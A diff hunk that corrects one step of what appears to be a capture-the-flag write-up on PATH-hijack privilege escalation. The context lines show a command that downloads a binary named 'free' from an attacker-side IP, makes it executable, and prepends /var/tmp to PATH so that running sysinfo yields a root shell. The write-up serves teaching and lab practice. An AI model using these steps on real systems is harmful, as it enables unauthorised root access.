@@ -337,7 +337,7 @@ theseus@ubuntu:/var/tmp$ wget http://10.10.14.23/free
 theseus@ubuntu:/var/tmp$ chmod 755 free
 ~~~
 
-3. Prepend the current directory or where the new _**"free"**_ executable is located to the PATH variable (this is the important part of this privilege escalation process), and run the _**"free"**_ executable to gain a root shell:
+3. Prepend the current directory or where the new _**"free"**_ executable is located to the PATH variable (this is the important part of this privilege escalation process), and run _**sysinfo**_ to gain a root shell:
 ~~~
 theseus@ubuntu:/var/tmp$ PATH=/var/tmp:$PATH
 theseus@ubuntu:/var/tmp$ sysinfo
